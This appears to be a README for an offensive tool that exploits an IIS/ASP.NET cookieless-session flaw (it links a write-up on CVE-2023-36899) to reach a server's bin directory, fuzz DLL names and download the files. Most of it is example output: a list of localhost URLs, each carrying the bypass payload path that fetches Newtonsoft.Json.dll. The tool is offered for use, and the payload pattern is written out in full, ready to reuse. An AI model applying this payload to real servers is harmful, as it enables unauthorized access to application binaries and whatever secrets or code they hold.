# Cookieless-Session-Bypasser-IIS
Used to perform cookieless session bypasses to reach into the bin directory and fuzz dll names and download them if the bug is present  hats off to the iis god himself and critical thinking podcast and SHubs without their constant knowledge drops i would have never learned this 


Article from the iis god himself
https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/


EXAMPLE OUTPUT
================


Found URLs:
[http://127.0.0.1:8200//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
http://127.0.0.1:83//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
http://127.0.0.1:8001//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
http://127.0.0.1:8086//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
https://127.0.0.1//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
http://127.0.0.1:81//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
http://127.0.0.1:81//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
http://127.0.0.1:8081//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
https://127.0.0.1//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
https://127.0.0.1//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
https://127.0.0.1//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
http://127.0.0.1:8085//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
https://127.0.0.1//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
https://127.0.0.1//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
http://127.0.0.1:81//(S(x))/b/(S(x))in/Newtonsoft.Json.dll,
http://127.0.0.1:81//(S(x))/b/(S(x))in/Newtonsoft.Json.dll]
